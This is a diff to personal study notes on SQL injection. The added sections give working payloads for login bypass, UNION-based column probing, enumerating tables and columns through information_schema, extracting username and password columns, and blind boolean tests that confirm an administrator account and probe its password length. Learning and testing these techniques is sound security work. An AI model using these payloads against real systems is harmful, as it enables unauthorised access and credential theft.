@@ -29,10 +29,16 @@ SQL injection in different parts of the query:
     - In SELECT statements, within the table or column name.
     - In SELECT statements, within the ORDER BY clause.
 
-UNION SQLi:
+SQLi Payloads:
+    - Skipping further query by commenting: Abcd'--
+    - Skipping all conditions: Abcd'+OR+1=1--
+    - Bypass login with username: user'--
+
+In-Band SQLi - UNION:
 - Key requirements for UNION query to work:
     - The individual queries must return the same number of columns
     - The data types in each column must be compatible between the individual queries
+- We use NULL as the values returned from the injected SELECT query because the data types in each column must be compatible between the original and the injected queries. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.
 - Determining the number of columns required:
     - Injecting series of ORDER BY clauses and incrementing the specified column index until an error occurs (out of range of the number): ' ORDER BY 1--
     - Submitting series of UNION SELECT payloads specifying a different number of null values: ' UNION SELECT NULL,NULL--
@@ -49,10 +55,22 @@ UNION SQLi:
         - Microsoft, MySQL: SELECT @@version
         - Oracle: SELECT * FROM v$version
         - PostgreSQL: SELECT version()
+- Listing the contents of the database:
+    - Query information_schema.tables view to list the tables in the database:
+        - ' UNION SELECT * FROM information_schema.tables
+        - ' UNION SELECT table_name, NULL FROM information_schema.tables--
+    - Query information_schema.columns to list the columns in individual tables:
+        - ' UNION SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+        - ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
+    - Retrieve the columns from the table:
+        - ' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
 
-- We use NULL as the values returned from the injected SELECT query because the data types in each column must be compatible between the original and the injected queries. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.
-
-Payloads:
-    - Skipping further query by commenting: Abcd'--
-    - Skipping all conditions: Abcd'+OR+1=1--
-    - Bypass login with username: user'--
+- Blind SQLi:
+    - Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
+    - Exploiting blind SQL injection by triggering conditional responses:
+        - With true: ' AND '1'='1
+        - With false: ' AND '1'='2
+        - Veriry/confirm table user: ' AND (SELECT 'a' FROM users LIMIT 1)='a
+        - Confirm user administrator exist in users table/column: ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+        - Determine how many characters are in the password of the administrator user: ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+        - Test different password lengths: ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
